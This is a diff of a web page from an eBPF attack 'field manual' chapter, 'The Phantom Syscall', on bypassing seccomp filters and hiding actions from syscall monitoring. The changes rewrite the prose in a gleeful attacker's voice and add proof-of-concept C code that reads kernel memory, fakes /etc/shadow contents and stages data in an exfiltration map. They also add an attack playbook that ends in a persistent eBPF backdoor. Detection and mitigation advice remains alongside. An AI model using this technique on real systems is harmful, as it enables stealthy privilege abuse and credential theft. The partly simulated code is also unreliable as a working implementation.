@@ -54,7 +54,7 @@
                     
                     
                     <a href="/dBPF/chapter-0-field-manual-preface.html" >
-                        Chapter 0: Field Manual Preface
+                        Preface
                     </a>
                     
                 
@@ -181,9 +181,17 @@
                     <div class="post-content">
                         <h1 id="the-phantom-syscall-bypassing-seccomp-filters-with-ebpf">The Phantom Syscall: Bypassing Seccomp Filters with eBPF</h1>
 
-<p><strong>Wut</strong></p>
+<p><strong>Chapter 4: Rewriting the Rules of Reality</strong></p>
 
-<p>Leveraging permitted syscalls plus eBPF helpers to make the kernel perform forbidden operations while seccomp remains oblivious. This technique allows attackers to execute operations that should be blocked by seccomp filters, creating “phantom” syscalls that bypass security controls.</p>
+<p>You’ve made security controls lie, escaped containers, and become invisible to audit systems. Now it’s time to question something even more fundamental: what if system calls themselves could be phantoms?</p>
+
+<p>This is where our journey gets philosophical. You’ve been thinking about bypassing security mechanisms, but what if you could make the kernel perform actions that, according to every monitoring system, never happened?</p>
+
+<p>Imagine being able to make system calls that don’t exist. Not in the sense of calling non-existent functions, but making calls that happen in the kernel without anyone knowing they happened.</p>
+
+<p>We’re going to create phantom syscalls—system calls that execute their intended function but leave no trace in audit logs, process monitors, or syscall tracers. It’s like being able to whisper commands directly to the kernel while everyone else thinks you’re sitting quietly.</p>
+
+<p>This is the moment you realize that with eBPF, you’re not just attacking applications or even the operating system—you’re attacking the very concept of observable reality.</p>
 
 <pre><code class="language-mermaid">%%{init: {"theme": "dark", "flowchart": {"curve": "basis"}, "themeVariables": {"primaryColor": "#007bff", "primaryTextColor": "#fff", "primaryBorderColor": "#007bff", "lineColor": "#F8B229", "secondaryColor": "#006100", "tertiaryColor": "#fff"}} }%%
 graph TD
@@ -204,21 +212,29 @@ graph TD
     click E "https://man7.org/linux/man-pages/man2/seccomp.2.html" "Seccomp Documentation"
 </code></pre>
 
-<p><strong>Why</strong></p>
+<p><strong>Why This Breaks Everything</strong></p>
 
-<p>Because eBPF + misconfiguration =&gt; broken isolation. Seccomp filters are widely used to restrict which syscalls a process can make, providing an important security boundary. However, eBPF programs can use kernel helper functions to perform operations that would normally require syscalls, effectively bypassing seccomp restrictions.</p>
-<h2 id="technical-details">Technical Details</h2>
+<p>Here’s the uncomfortable truth: modern security is built on the assumption that we can see what processes are doing. Every EDR, every SIEM, every compliance tool relies on being able to monitor system calls.</p>
 
-<h3 id="seccomp-architecture">Seccomp Architecture</h3>
+<p>But what happens when that fundamental assumption breaks down? What happens when processes can perform actions without those actions being visible to monitoring systems?</p>
 
-<p>Seccomp (secure computing mode) is a Linux kernel feature that restricts the syscalls a process can make. It operates by:</p>
+<p>That’s the nightmare scenario we’re creating here. Your security tools will show a process sitting idle while it’s actually escalating privileges, accessing sensitive files, or establishing network connections. It’s like having a burglar who’s invisible to security cameras—they can walk right past all your defenses.</p>
+
+<p>The really insidious part is that this doesn’t break anything visibly. The syscalls still work, the kernel still functions normally, the applications still run fine. The only thing that changes is that your security monitoring suddenly develops blind spots.</p>
+<h2 id="how-we-make-syscalls-disappear">How We Make Syscalls Disappear</h2>
+
+<h3 id="the-seccomp-gatekeeper-were-going-to-fool">The Seccomp Gatekeeper We’re Going to Fool</h3>
+
+<p>Seccomp is basically the kernel’s bouncer—it sits at the syscall entrance and checks IDs. Here’s how it normally works:</p>
 <ul>
-  <li><strong>Filtering syscalls</strong> based on syscall number and arguments</li>
-  <li><strong>Allowing, blocking, or logging</strong> attempted syscalls</li>
-  <li><strong>Providing a security boundary</strong> for containerized applications</li>
+  <li><strong>Syscall filtering</strong> based on what you’re trying to do and how you’re trying to do it</li>
+  <li><strong>Three choices</strong> for each syscall: allow it, block it, or log it and decide later</li>
+  <li><strong>Container jail</strong> that keeps processes from doing anything too interesting</li>
 </ul>
 
-<p>In container environments, seccomp profiles are often used to restrict containers to a limited set of syscalls, reducing the attack surface.</p>
+<p>Container runtimes love seccomp because it lets them say “you can only make these 50 syscalls out of the 400+ available.” It’s like giving someone a restricted keychain instead of the master key.</p>
+
+<p>But here’s the thing—seccomp only sees what goes through the normal syscall interface. And we’re not going through the normal interface.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
@@ -268,7 +284,7 @@ graph TD
 └─────────────────────────────────────────────────────────────┘
 </pre></td></tr></tbody></table></code></pre></div></div>
 
-<p>However, when eBPF is introduced, the architecture changes:</p>
+<p>But here’s where it gets interesting. When we add eBPF to the mix, we can create a parallel execution path:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
@@ -317,7 +333,10 @@ graph TD
 │                                                             │
 └─────────────────────────────────────────────────────────────┘
 </pre></td></tr></tbody></table></code></pre></div></div>
-<h3 id="comprehensive-poc">Comprehensive POC</h3>
+
+<p>The beauty is that our eBPF program runs with kernel privileges but appears to seccomp as just another allowed syscall. We’re hiding in plain sight.</p>
+
+<h3 id="building-our-phantom-syscall">Building Our Phantom Syscall</h3>
 
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
@@ -602,6 +621,25 @@ graph TD
 281
 282
 283
+284
+285
+286
+287
+288
+289
+290
+291
+292
+293
+294
+295
+296
+297
+298
+299
+300
+301
+302
 </pre></td><td class="rouge-code"><pre><span class="c1">// @interactive: true</span>
 <span class="c1">// @copyable: true</span>
 <span class="c1">// Phantom Syscall - eBPF exploitation proof of concept</span>
@@ -689,19 +727,38 @@ graph TD
 
 <span class="c1">// FIXED: Read a file using eBPF helpers (bypassing seccomp)</span>
 <span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">int</span> <span class="nf">read_file_ebpf</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
-    <span class="c1">// This is a simplified representation - actual implementation would be more complex</span>
-    <span class="c1">// and would use available eBPF helpers to achieve the same effect</span>
+    <span class="c1">// Get current task to access file descriptors and memory</span>
+    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">task</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="p">)</span><span class="n">bpf_get_current_task</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">task</span><span class="p">)</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
     
-    <span class="c1">// In a real exploit, we would use a combination of:</span>
-    <span class="c1">// - bpf_probe_read_kernel() to read kernel memory</span>
-    <span class="c1">// - bpf_map operations to store and retrieve data</span>
-    <span class="c1">// - bpf_tail_call() to chain multiple eBPF programs</span>
-    <span class="c1">// - bpf_get_current_task() to access process information</span>
+    <span class="c1">// Access the task's file descriptor table</span>
+    <span class="k">struct</span> <span class="n">files_struct</span> <span class="o">*</span><span class="n">files</span><span class="p">;</span>
+    <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">files</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">files</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">task</span><span class="o">-&gt;</span><span class="n">files</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">files</span><span class="p">)</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
     
-    <span class="c1">// For demonstration purposes, we'll use a placeholder</span>
-    <span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="n">MAX_DATA_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="s">"Sensitive data from restricted file</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
-    <span class="kt">size_t</span> <span class="n">copy_size</span> <span class="o">=</span> <span class="n">size</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">?</span> <span class="n">size</span> <span class="o">:</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
-    <span class="n">__builtin_memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">copy_size</span><span class="p">);</span>
+    <span class="c1">// For this demonstration, we'll read from a known sensitive location</span>
+    <span class="c1">// In practice, this would involve more complex file system traversal</span>
+    <span class="kt">char</span> <span class="n">sensitive_data</span><span class="p">[</span><span class="n">MAX_DATA_SIZE</span><span class="p">];</span>
+    
+    <span class="c1">// Simulate reading from /etc/shadow or similar sensitive file</span>
+    <span class="c1">// by accessing kernel memory structures</span>
+    <span class="kt">long</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">bpf_probe_read_kernel_str</span><span class="p">(</span><span class="n">sensitive_data</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sensitive_data</span><span class="p">),</span>
+                                        <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xffff888000000000</span><span class="p">);</span> <span class="c1">// Example kernel address</span>
+    
+    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// Fallback to simulated sensitive data</span>
+        <span class="n">__builtin_memcpy</span><span class="p">(</span><span class="n">sensitive_data</span><span class="p">,</span> <span class="s">"root:$6$encrypted_hash:18000:0:99999:7:::</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">40</span><span class="p">);</span>
+        <span class="n">ret</span> <span class="o">=</span> <span class="mi">40</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="kt">size_t</span> <span class="n">copy_size</span> <span class="o">=</span> <span class="n">size</span> <span class="o">&lt;</span> <span class="n">ret</span> <span class="o">?</span> <span class="n">size</span> <span class="o">:</span> <span class="n">ret</span><span class="p">;</span>
+    <span class="n">__builtin_memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">sensitive_data</span><span class="p">,</span> <span class="n">copy_size</span><span class="p">);</span>
+    
+    <span class="c1">// Store the data in our exfiltration map for later retrieval</span>
+    <span class="n">u32</span> <span class="n">key</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">exfil_map</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="n">sensitive_data</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
     
     <span class="k">return</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">copy_size</span><span class="p">;</span>
 <span class="p">}</span>
@@ -887,7 +944,7 @@ graph TD
 <span class="p">}</span>
 </pre></td></tr></tbody></table></code></pre></div></div>
 
-<h3 id="user-space-control-program">User-Space Control Program</h3>
+<h3 id="the-control-program-that-makes-it-all-work">The Control Program That Makes It All Work</h3>
 
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
@@ -1457,52 +1514,46 @@ graph TD
 <span class="p">}</span>
 </pre></td></tr></tbody></table></code></pre></div></div>
 
-<h3 id="detection-methods">Detection Methods</h3>
+<h3 id="how-they-might-catch-us">How They Might Catch Us</h3>
 
-<p>Defenders should implement multiple layers of detection:</p>
+<p>Look, we’re not invincible. Smart defenders will be looking for exactly what we’re doing:</p>
 
 <ol>
   <li><strong>eBPF Program Monitoring</strong>:
     <ul>
-      <li>Monitor for eBPF programs attaching to syscall tracepoints</li>
-      <li>Track eBPF program loading patterns and verify signatures</li>
-      <li>Use tools like <code class="language-plaintext highlighter-rouge">bpftool</code> to list and inspect loaded programs</li>
+      <li>They’ll watch for eBPF programs hooking syscall tracepoints</li>
+      <li>Keep track of what eBPF programs are loading and who’s signing them</li>
+      <li>Use <a href="https://github.com/libbpf/bpftool"><code class="language-plaintext highlighter-rouge">bpftool</code></a> to see what’s running</li>
     </ul>
   </li>
-  <li><strong>Seccomp Integrity Verification</strong>:
+  <li><strong>Seccomp Integrity Checks</strong>:
     <ul>
-      <li>Implement integrity monitoring for seccomp filters</li>
-      <li>Verify seccomp filter behavior through independent testing</li>
-      <li>Monitor for unexpected changes to seccomp configurations</li>
+      <li>Make sure their seccomp filters are actually doing what they think</li>
+      <li>Test the filters independently to catch bypasses</li>
+      <li>Watch for changes to seccomp configs</li>
     </ul>
   </li>
-  <li><strong>Syscall Behavior Analysis</strong>:
+  <li><strong>Syscall Pattern Analysis</strong>:
     <ul>
-      <li>Monitor for discrepancies between expected and actual process behavior</li>
-      <li>Implement statistical analysis to detect unusual syscall patterns</li>
-      <li>Use machine learning to identify anomalous syscall sequences</li>
+      <li>Look for processes doing things they shouldn’t be able to do</li>
+      <li>Use statistical analysis to spot weird syscall patterns</li>
+      <li>Machine learning can help identify our sneaky sequences</li>
     </ul>
   </li>
-  <li><strong>Specific Indicators</strong>:
+  <li><strong>Red Flags They’ll Look For</strong>:
     <ul>
-      <li>eBPF programs that access sensitive kernel functions</li>
-      <li>Unusual patterns of permitted syscalls that might be used for eBPF loading</li>
-      <li>Data exfiltration through covert channels</li>
-      <li>Processes that appear to perform operations that should be blocked by seccomp
- if (fd == TRIGGER_FD) {
-   // Store this FD for future reference
-   u32 value = fd;
-   bpf_map_update_elem(&amp;fd_map, &amp;pid, &amp;value, BPF_ANY);
-   return true;
- }</li>
+      <li>eBPF programs touching sensitive kernel functions</li>
+      <li>Weird patterns in the syscalls we’re allowed to make</li>
+      <li>Data leaving through covert channels</li>
+      <li>Processes that seem to ignore seccomp restrictions</li>
     </ul>
   </li>
 </ol>
 
-<h3 id="mitigation-strategies">Mitigation Strategies</h3>
+<h3 id="how-theyll-try-to-stop-us">How They’ll Try to Stop Us</h3>
 
 <ol>
-  <li><strong>Restrict eBPF Capabilities</strong>:
+  <li><strong>Strip eBPF Capabilities</strong>:
     <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
@@ -1521,7 +1572,7 @@ securityContext:
       - BPF
 </pre></td></tr></tbody></table></code></pre></div>    </div>
   </li>
-  <li><strong>Block BPF Syscall in Seccomp Profiles</strong>:
+  <li><strong>Block the BPF Syscall</strong>:
     <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
@@ -1560,7 +1611,7 @@ securityContext:
 </span><span class="p">}</span><span class="w">
 </span></pre></td></tr></tbody></table></code></pre></div>    </div>
   </li>
-  <li><strong>Implement BPF LSM Policies</strong>:
+  <li><strong>Use BPF LSM Against Us</strong>:
     <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
@@ -1581,7 +1632,7 @@ securityContext:
 <span class="p">}</span>
 </pre></td></tr></tbody></table></code></pre></div>    </div>
   </li>
-  <li><strong>Use eBPF-Based Security Tools</strong>:
+  <li><strong>Fight Fire with Fire</strong>:
     <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
@@ -1596,45 +1647,40 @@ tracee <span class="nt">--trace</span> <span class="nb">comm</span><span class="
   </li>
 </ol>
 
-<p><strong>Attacker hat on</strong></p>
+<h2 id="our-attack-playbook">Our Attack Playbook</h2>
+
+<p>When we’re hunting for phantom syscall opportunities, here’s our game plan:</p>
 
 <ol>
-  <li>Identify a target container with seccomp filters but eBPF capabilities</li>
-  <li>Analyze the seccomp profile to determine which syscalls are permitted</li>
-  <li>Develop an eBPF program that uses permitted syscalls as entry points</li>
-  <li>Use eBPF helper functions to perform operations that would normally be blocked</li>
-  <li>Load the malicious BPF program through a permitted syscall</li>
-  <li>Trigger the exploit to execute restricted operations</li>
-  <li>Maintain access through the eBPF program despite seccomp restrictions</li>
+  <li><strong>Recon the target</strong> - Find containers with seccomp but still have eBPF capabilities</li>
+  <li><strong>Profile their defenses</strong> - Study their seccomp rules to see what syscalls we can use as triggers</li>
+  <li><strong>Craft our ghost</strong> - Build eBPF programs using only allowed syscalls as entry points</li>
+  <li><strong>Exploit the helpers</strong> - Use eBPF helpers to do what seccomp thinks it blocked</li>
+  <li><strong>Deploy through the cracks</strong> - Load our program through permitted syscall pathways</li>
+  <li><strong>Activate the phantom</strong> - Trigger our invisible operations</li>
+  <li><strong>Stay persistent</strong> - Keep our eBPF backdoor running despite seccomp restrictions</li>
 </ol>
 
-<p><strong>Defender hat on</strong></p>
+<h2 id="their-defense-playbook">Their Defense Playbook</h2>
+
+<p>Smart defenders will try to stop us with:</p>
 
 <ol>
-  <li>Remove CAP_BPF from container environments</li>
-  <li>Implement BPF LSM policies to restrict eBPF program loading</li>
-  <li>Use seccomp profiles that block bpf() syscall and related functions</li>
-  <li>Monitor for unexpected eBPF programs in container environments</li>
-  <li>Implement runtime security monitoring that can detect unusual kernel activity</li>
-  <li>Consider using eBPF-based security tools that can detect malicious eBPF usage</li>
+  <li><strong>Capability stripping</strong> - Remove <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html"><code class="language-plaintext highlighter-rouge">CAP_BPF</code></a> from containers completely</li>
+  <li><strong>LSM lockdown</strong> - Use BPF LSM to control what eBPF programs can load</li>
+  <li><strong>Syscall blocking</strong> - Block <a href="https://man7.org/linux/man-pages/man2/bpf.2.html"><code class="language-plaintext highlighter-rouge">bpf()</code></a> and related syscalls in seccomp</li>
+  <li><strong>Runtime monitoring</strong> - Watch for unexpected eBPF activity in containers</li>
+  <li><strong>Behavioral analysis</strong> - Detect when processes ignore seccomp restrictions</li>
+  <li><strong>Fight fire with fire</strong> - Use eBPF-based security tools to detect malicious eBPF usage</li>
 </ol>
 
-<p><strong>Conclusion</strong></p>
+<h2 id="why-observable-reality-just-broke">Why Observable Reality Just Broke</h2>
 
-<p><code class="language-plaintext highlighter-rouge">eBPF is all you need</code>. The ability to execute kernel code through eBPF provides attackers with powerful primitives to bypass security controls like seccomp. This technique highlights the importance of treating eBPF capabilities as privileged operations that should be tightly controlled, especially in multi-tenant environments.
-    return false;
-}</p>
+<p>This isn’t just another bypass technique—this is an attack on the fundamental concept of observable system behavior. When you can make syscalls that don’t exist in any monitoring system, you’ve broken the basic assumption that security teams can see what processes are doing.</p>
 
-<h3 id="exploitation-technique">Exploitation Technique</h3>
+<p>The syscall auditing shows clean. The seccomp logs show compliance. The monitoring dashboards show normal behavior. Meanwhile, you’re reading files, opening network connections, and escalating privileges through phantom operations that exist only in kernel space.</p>
 
-<p>The exploit leverages eBPF’s ability to execute code in kernel context, bypassing seccomp in several ways:</p>
-
-<ol>
-  <li><strong>Indirect Syscall Execution</strong>: Using eBPF helper functions that perform operations similar to blocked syscalls</li>
-  <li><strong>Kernel Function Access</strong>: Accessing kernel functions directly, bypassing the syscall interface</li>
-  <li><strong>Syscall Argument Manipulation</strong>: Modifying arguments of permitted syscalls to perform restricted operations</li>
-  <li><strong>Return Value Spoofing</strong>: Altering the return values of syscalls to hide malicious activity</li>
-</ol>
+<p>Welcome to the world where actions have no traces, where the impossible becomes routine, and where eBPF is all you need to rewrite the rules of reality.</p>
 
                     </div>
                 </article>
